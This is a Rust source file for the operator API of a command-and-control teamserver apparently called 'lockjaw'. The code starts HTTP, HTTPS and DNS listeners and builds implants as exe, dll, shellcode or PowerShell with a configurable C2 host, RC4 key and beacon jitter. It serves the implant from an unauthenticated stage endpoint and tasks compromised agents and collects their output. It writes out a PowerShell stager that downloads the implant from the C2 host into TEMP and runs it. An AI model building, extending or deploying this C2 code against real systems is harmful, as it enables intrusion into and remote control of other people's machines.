use anyhow::Result;
use axum::{
    extract::{Path, State},
    routing::{get, post},
    Json, Router,
    http::{StatusCode, HeaderMap},
};
use serde::{Deserialize, Serialize};
use std::sync::Arc;
use crate::storage::Storage;
use tracing::{info, warn, error};
use axum_server::tls_rustls::RustlsConfig;
use std::net::SocketAddr;
use std::path::PathBuf;
use axum_server::Handle;
use tokio::sync::Mutex;
use crate::listeners::ListenerManager;

#[derive(Clone)]
pub struct OperatorState {
    pub storage: Arc<Storage>,
    pub api_key: String,
    pub agent_cert_path: PathBuf,
    pub agent_key_path: PathBuf,
    pub build_lock: Arc<Mutex<()>>,
    pub listener_manager: Arc<ListenerManager>,
}

#[derive(Serialize, sqlx::FromRow)]
pub struct AgentResponse {
    pub id: String,
    pub hostname: Option<String>,
    pub username: Option<String>,
    pub ip_address: Option<String>,
    pub external_ip: Option<String>,
    pub os_info: Option<String>,
    pub sleep: i32,
    pub last_seen: Option<String>,
    pub status: String,
}

#[derive(Deserialize)]
pub struct CreateTaskRequest {
    pub agent_id: String,
    pub command: String,
    pub arguments: String,
}

#[derive(Deserialize)]
pub struct GeneratePayloadRequest {
    pub host: String,
    pub port: u16,
    pub domain: String,
    #[serde(default = "default_protocol")]
    pub protocol: String, // "http" or "dns"
    /// RC4 session key as 32-char hex string (e.g. "deadbeefdeadbeefdeadbeefdeadbeef")
    #[serde(default = "default_key")]
    pub key: String,
    /// Beacon sleep interval in seconds
    #[serde(default = "default_sleep")]
    pub sleep: u32,
    /// Jitter percentage 0-100
    #[serde(default = "default_jitter")]
    pub jitter: u32,
    #[serde(default = "default_format")]
    pub format: String, // "exe", "dll", "powershell", "shellcode"
    #[serde(default = "default_staged")]
    pub is_staged: bool,
    #[serde(default = "default_use_ps")]
    pub use_ps: bool,
    pub name: Option<String>,
}

fn default_format() -> String { "exe".to_string() }
fn default_staged() -> bool { false }
fn default_use_ps() -> bool { false }
fn default_protocol() -> String { "http".to_string() }

fn default_key() -> String { "deadbeefdeadbeefdeadbeefdeadbeef".to_string() }
fn default_sleep() -> u32 { 5 }
fn default_jitter() -> u32 { 20 }

#[derive(Deserialize)]
pub struct StartListenerRequest {
    pub port: u16,
    pub protocol: String, // "https" or "dns"
    pub domain: Option<String>,
    pub key: Option<String>,
}

#[derive(Serialize, sqlx::FromRow)]
pub struct TaskResponse {
    pub id: String,
    pub agent_id: Option<String>,
    pub command: Option<String>,
    pub arguments: Option<String>,
    pub status: Option<String>,
}

pub struct OperatorApi {
    pub state: OperatorState,
    pub cert_path: PathBuf,
    pub key_path: PathBuf,
    pub handle: Handle,
}

impl OperatorApi {
    pub fn new(
        storage: Arc<Storage>,
        api_key: String,
        cert_path: PathBuf,
        key_path: PathBuf,
        agent_cert_path: PathBuf,
        agent_key_path: PathBuf,
        handle: Handle,
        listener_manager: Arc<ListenerManager>,
    ) -> Self {
        Self {
            state: OperatorState { 
                storage, 
                api_key, 
                agent_cert_path, 
                agent_key_path,
                build_lock: Arc::new(Mutex::new(())),
                listener_manager,
            },
            cert_path,
            key_path,
            handle,
        }
    }

    pub fn router(&self) -> Router {
        Router::new()
            .route("/connect", get(operator_connect))
            .route("/listeners", post(start_listener))
            .route("/listeners", get(list_listeners))
            .route("/listeners/protocols", get(list_protocols))
            .route("/listeners/{id}", post(stop_listener))
            .route("/payload", post(generate_payload))
            .route("/stage", get(serve_stage))
            .route("/agents", get(get_agents))
            .route("/tasks", post(create_task))
            .route("/tasks/{agent_id}", get(get_tasks))
            .route("/results/{task_id}", get(get_task_result))
            .route("/agents/{id}", post(delete_agent))
            .with_state(self.state.clone())
    }

    pub async fn run(self, addr: SocketAddr) -> Result<()> {
        let config = RustlsConfig::from_pem_file(
            &self.cert_path,
            &self.key_path
        ).await?;

        info!("Operator HTTPS API starting on {}...", addr);

        axum_server::bind_rustls(addr, config)
            .handle(self.handle.clone())
            .serve(self.router().into_make_service())
            .await?;

        Ok(())
    }
}

async fn check_auth(headers: &HeaderMap, state: &OperatorState) -> Result<(), StatusCode> {
    match headers.get("Authorization") {
        Some(value) if value == &state.api_key => Ok(()),
        _ => Err(StatusCode::UNAUTHORIZED),
    }
}

async fn operator_connect(
    headers: HeaderMap,
    State(state): State<OperatorState>,
) -> Result<StatusCode, StatusCode> {
    check_auth(&headers, &state).await?;
    info!("Operator connected to teamserver via CLI");
    Ok(StatusCode::OK)
}

async fn start_listener(
    headers: HeaderMap,
    State(state): State<OperatorState>,
    Json(payload): Json<StartListenerRequest>,
) -> Result<Json<serde_json::Value>, StatusCode> {
    check_auth(&headers, &state).await?;

    info!("Operator requesting to start a new {} listener on port {}", payload.protocol, payload.port);

    if payload.protocol.to_lowercase() == "http" {
        let addr_str = format!("0.0.0.0:{}", payload.port);
        let addr: SocketAddr = addr_str.parse().map_err(|_| StatusCode::BAD_REQUEST)?;

        let key = payload.key.unwrap_or_else(|| "deadbeefdeadbeefdeadbeefdeadbeef".to_string());

        match state.listener_manager.start_http(addr, key).await {
            Ok(id) => Ok(Json(serde_json::json!({ "status": "started", "id": id, "port": payload.port }))),
            Err(e) => {
                error!("Failed to start HTTP listener: {}", e);
                Err(StatusCode::INTERNAL_SERVER_ERROR)
            }
        }
    } else if payload.protocol.to_lowercase() == "https" {
        let addr_str = format!("0.0.0.0:{}", payload.port);
        let addr: SocketAddr = addr_str.parse().map_err(|_| StatusCode::BAD_REQUEST)?;

        let key = payload.key.unwrap_or_else(|| "deadbeefdeadbeefdeadbeefdeadbeef".to_string());

        match state.listener_manager.start_https(
            addr,
            state.agent_cert_path.clone(),
            state.agent_key_path.clone(),
            key
        ).await {
            Ok(id) => Ok(Json(serde_json::json!({ "status": "started", "id": id, "port": payload.port }))),
            Err(e) => {
                error!("Failed to start HTTPS listener: {}", e);
                Err(StatusCode::INTERNAL_SERVER_ERROR)
            }
        }
    } else if payload.protocol.to_lowercase() == "dns" {        let addr_str = format!("0.0.0.0:{}", payload.port);
        let addr: SocketAddr = addr_str.parse().map_err(|_| StatusCode::BAD_REQUEST)?;
        
        let domain = payload.domain.clone().ok_or(StatusCode::BAD_REQUEST)?;
        let key = payload.key.unwrap_or_else(|| "deadbeefdeadbeefdeadbeefdeadbeef".to_string());
        
        match state.listener_manager.start_dns(addr, domain, key).await {
            Ok(id) => Ok(Json(serde_json::json!({ "status": "started", "id": id, "port": payload.port, "domain": payload.domain }))),
            Err(e) => {
                error!("Failed to start DNS listener: {}", e);
                Err(StatusCode::INTERNAL_SERVER_ERROR)
            }
        }
    } else {
        warn!("Unsupported protocol requested: {}", payload.protocol);
        Err(StatusCode::BAD_REQUEST)
    }
}

async fn list_listeners(
    headers: HeaderMap,
    State(state): State<OperatorState>,
) -> Result<Json<serde_json::Value>, StatusCode> {
    check_auth(&headers, &state).await?;
    let listeners = state.listener_manager.list().await;
    Ok(Json(serde_json::json!(listeners)))
}

async fn list_protocols(
    headers: HeaderMap,
    State(state): State<OperatorState>,
) -> Result<Json<Vec<String>>, StatusCode> {
    check_auth(&headers, &state).await?;
    let protocols = state.listener_manager.get_supported_protocols();
    Ok(Json(protocols))
}

async fn stop_listener(
    headers: HeaderMap,
    Path(id): Path<String>,
    State(state): State<OperatorState>,
) -> Result<StatusCode, StatusCode> {
    check_auth(&headers, &state).await?;
    if state.listener_manager.stop(&id).await {
        Ok(StatusCode::OK)
    } else {
        Err(StatusCode::NOT_FOUND)
    }
}

async fn serve_stage(
    State(_state): State<OperatorState>,
) -> Result<Vec<u8>, StatusCode> {
    // Stage endpoint serves the compiled implant binary
    let implant_path = PathBuf::from("../implant/zig-out/bin/lockjaw_implant.exe");
    match std::fs::read(&implant_path) {
        Ok(data) => Ok(data),
        Err(e) => {
            error!("Failed to read implant for staging: {}", e);
            Err(StatusCode::NOT_FOUND)
        }
    }
}

async fn generate_payload(
    headers: HeaderMap,
    State(state): State<OperatorState>,
    Json(payload): Json<GeneratePayloadRequest>,
) -> Result<Json<serde_json::Value>, StatusCode> {
    check_auth(&headers, &state).await?;

    info!("Generating payload... Host: {}, Port: {}, Sleep: {}s +/-{}%, Key: {}",
        payload.host, payload.port, payload.sleep, payload.jitter, &payload.key[..8]);

    // Acquire build lock to prevent concurrent Zig processes from conflicting on the cache
    let _lock = state.build_lock.lock().await;

    // Hardcoded path to the implant directory relative to the teamserver execution
    let implant_dir = PathBuf::from("../implant");

    // Isolated cache directories in /tmp/ to avoid DrvFs/AccessDenied issues on /mnt/c/
    let cache_dir = "/tmp/lockjaw_zig_cache";
    let global_cache_dir = "/tmp/lockjaw_global_cache";

    // Always wipe the per-project build cache before compiling.
    //
    // Why: build.zig generates src/pic_stager_final.s as a side-effect during the build phase
    // (reading pic_stager.s from disk and writing the config-patched version). Zig's caching
    // system may not detect this as a genuine input-dependency change and can return a stale
    // cached binary even after the assembly source changes. Dropping the local cache guarantees
    // every generate_payload call assembles from the current source on disk.
    //
    // The GLOBAL cache (Zig std library, compiler internals) is intentionally preserved —
    // rebuilding it would add 30-60s per request. Only the ~2s project-artifact compile is lost.
    if let Err(e) = std::fs::remove_dir_all(cache_dir) {
        if e.kind() != std::io::ErrorKind::NotFound {
            warn!("Could not wipe Zig project cache at {}: {}", cache_dir, e);
        }
    } else {
        info!("Wiped Zig project cache at {} (assembly source may have changed)", cache_dir);
    }

    // Set up standard build parameters
    // Use full path to zig binary since it may not be in PATH when invoked by the Teamserver.
    // Zig 0.15.x uses --release=small instead of -Doptimize=ReleaseSmall.
    let zig_bin = std::env::var("ZIG_PATH").unwrap_or_else(|_| "/snap/zig/current/zig".to_string());

    // Determine extension and build arguments based on format
    let (artifact_ext, is_dll, is_shellcode) = match payload.format.to_lowercase().as_str() {
        "dll"        => ("dll", true,  false),
        "shellcode"  => ("bin", false, true),
        "powershell" => ("exe", false, false), // PS generates stager for EXE
        _            => ("exe", false, false),
    };

    let mut cmd = std::process::Command::new(&zig_bin);
    cmd.arg("build")
        .arg("--release=small")
        .arg(&format!("-Dc2_host={}", payload.host))
        .arg(&format!("-Dc2_port={}", payload.port))
        .arg(&format!("-Dc2_domain={}", payload.domain))
        .arg(&format!("-Dc2_transport={}", payload.protocol))
        .arg(&format!("-Dc2_key={}", payload.key))
        .arg(&format!("-Dc2_sleep={}", payload.sleep))
        .arg(&format!("-Dc2_jitter={}", payload.jitter))
        .arg(&format!("-Dis_stager={}", payload.is_staged))
        .arg(&format!("-Duse_ps_stager={}", payload.use_ps))
        .arg(&format!("-Dis_dll={}", is_dll))
        .arg(&format!("-Dis_shellcode={}", is_shellcode))
        .arg("--cache-dir").arg(cache_dir)
        .arg("--global-cache-dir").arg(global_cache_dir)
        .current_dir(&implant_dir);

    // Execute the primary compilation
    let output = match cmd.output() {
        Ok(out) => out,
        Err(e) => {
            tracing::error!("Failed to execute 'zig build': {}", e);
            return Err(StatusCode::INTERNAL_SERVER_ERROR);
        }
    };
    if !output.status.success() {
        let stderr = String::from_utf8_lossy(&output.stderr);
        tracing::error!("Zig build failed: {}", stderr);
        return Ok(Json(serde_json::json!({ 
            "status": "error", 
            "message": format!("Zig build failed:\n{}", stderr) 
        })));
    }

    // If we just built shellcode, we ALSO need to build the main implant for the stager to download
    if is_shellcode {
        let mut implant_cmd = std::process::Command::new(&zig_bin);
        implant_cmd.arg("build")
            .arg("--release=small")
            .arg(&format!("-Dc2_host={}", payload.host))
            .arg(&format!("-Dc2_port={}", payload.port))
            .arg(&format!("-Dc2_domain={}", payload.domain))
            .arg(&format!("-Dc2_transport={}", payload.protocol))
            .arg(&format!("-Dc2_key={}", payload.key))
            .arg(&format!("-Dc2_sleep={}", payload.sleep))
            .arg(&format!("-Dc2_jitter={}", payload.jitter))
            .arg("-Dis_shellcode=false")
            .arg("-Dis_stager=false")
            .arg("--cache-dir").arg(cache_dir)
            .arg("--global-cache-dir").arg(global_cache_dir)
            .current_dir(&implant_dir);
        
        let _ = implant_cmd.output(); // Best effort build of the implant exe
    }
    // Read the compiled artifact off disk
    let extension = match payload.format.to_lowercase().as_str() {
        "dll" => "dll",
        "powershell" => "ps1",
        "shellcode" => "bin",
        _ => "exe",
    };

    let artifact_name = if let Some(ref n) = payload.name {
        n.clone()
    } else {
        use rand::{distr::Alphanumeric, Rng};
        rand::rng()
            .sample_iter(&Alphanumeric)
            .take(8)
            .map(char::from)
            .collect()
    };

    let build_artifact_name = if is_shellcode || payload.is_staged { "lockjaw_stager" } else { "lockjaw_implant" };
    let bin_path = implant_dir.join("zig-out").join("bin").join(format!("{}.{}", build_artifact_name, artifact_ext));
    
    let bin_data = match std::fs::read(&bin_path) {
        Ok(data) => data,
        Err(e) => {
            tracing::error!("Failed to read compiled payload at {:?}: {}", bin_path, e);
            return Err(StatusCode::INTERNAL_SERVER_ERROR);
        }
    };

    // If format is powershell, wrap the artifact in a download/execute script
    if payload.format.to_lowercase() == "powershell" {
        let ps_stager = format!(
            "$w=New-Object System.Net.WebClient;$f=\"$env:TEMP\\lj.exe\";$w.DownloadFile(\"https://{}:{}/stage\",\"$f\");Start-Process \"$f\"",
            payload.host, payload.port
        );
        
        info!("Payload generation successful (PowerShell), returning stager script");
        
        return Ok(Json(serde_json::json!({ 
            "status": "success", 
            "file_name": "lockjaw_stager.ps1",
            "payload_base64": base64::engine::general_purpose::STANDARD.encode(ps_stager.as_bytes())
        })));
    }

    // Return the artifact encoded cleanly 
    use base64::{Engine as _, engine::general_purpose};
    let base64_payload = general_purpose::STANDARD.encode(&bin_data);
    
    info!("Payload cross-compile successful, returning {} bytes", bin_data.len());
    
    Ok(Json(serde_json::json!({ 
        "status": "success", 
        "file_name": format!("{}.{}", artifact_name, extension),
        "payload_base64": base64_payload 
    })))
}

async fn get_agents(
    headers: HeaderMap,
    State(state): State<OperatorState>,
) -> Result<Json<Vec<AgentResponse>>, StatusCode> {
    check_auth(&headers, &state).await?;
    
    info!("Operator requested agent list");
    
    let agents = sqlx::query_as::<_, AgentResponse>(
        "SELECT id, hostname, username, ip_address, external_ip, os_info, sleep, last_seen,
         CASE 
            WHEN last_seen < datetime('now', '-' || (sleep * 3) || ' seconds') THEN 'inactive'
            ELSE 'active'
         END as status
         FROM agents"
    )
    .fetch_all(state.storage.pool())
    .await
    .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;

    Ok(Json(agents))
}

async fn delete_agent(
    headers: HeaderMap,
    Path(id): Path<String>,
    State(state): State<OperatorState>,
) -> Result<StatusCode, StatusCode> {
    check_auth(&headers, &state).await?;
    
    info!("Operator requested deletion of agent {}", id);
    
    // Delete orphan tasks and results first if needed, 
    // but here we just delete the agent. 
    // Dependent tasks might need CASCADE or manual cleanup.
    
    sqlx::query("DELETE FROM results WHERE task_id IN (SELECT id FROM tasks WHERE agent_id = ?)")
        .bind(&id)
        .execute(state.storage.pool())
        .await
        .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;

    sqlx::query("DELETE FROM tasks WHERE agent_id = ?")
        .bind(&id)
        .execute(state.storage.pool())
        .await
        .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;

    let result = sqlx::query("DELETE FROM agents WHERE id = ?")
        .bind(&id)
        .execute(state.storage.pool())
        .await
        .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;

    if result.rows_affected() > 0 {
        Ok(StatusCode::OK)
    } else {
        Err(StatusCode::NOT_FOUND)
    }
}

async fn create_task(
    headers: HeaderMap,
    State(state): State<OperatorState>,
    Json(payload): Json<CreateTaskRequest>,
) -> Result<Json<serde_json::Value>, StatusCode> {
    check_auth(&headers, &state).await?;
    
    info!("Operator creating task for agent {}: {}", payload.agent_id, payload.command);

    let task_id = state.storage.create_task(&payload.agent_id, &payload.command, &payload.arguments)
        .await
        .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;

    Ok(Json(serde_json::json!({ "task_id": task_id })))
}

async fn get_tasks(
    headers: HeaderMap,
    Path(agent_id): Path<String>,
    State(state): State<OperatorState>,
) -> Result<Json<Vec<TaskResponse>>, StatusCode> {
    check_auth(&headers, &state).await?;
    
    let tasks = sqlx::query_as::<_, TaskResponse>(
        "SELECT id, agent_id, command, arguments, status FROM tasks WHERE agent_id = ?"
    )
    .bind(agent_id)
    .fetch_all(state.storage.pool())
    .await
    .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;

    Ok(Json(tasks))
}

async fn get_task_result(
    headers: HeaderMap,
    Path(task_id): Path<String>,
    State(state): State<OperatorState>,
) -> Result<Json<serde_json::Value>, StatusCode> {
    check_auth(&headers, &state).await?;
    
    use sqlx::Row;
    let result = sqlx::query("SELECT output FROM results WHERE task_id = ?")
        .bind(&task_id)
        .fetch_optional(state.storage.pool())
        .await
        .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;

    match result {
        Some(row) => {
            let output: Vec<u8> = row.get("output");
            Ok(Json(serde_json::json!({
                "task_id": task_id,
                "output": output
            })))
        },
        None => Err(StatusCode::NOT_FOUND),
    }
}
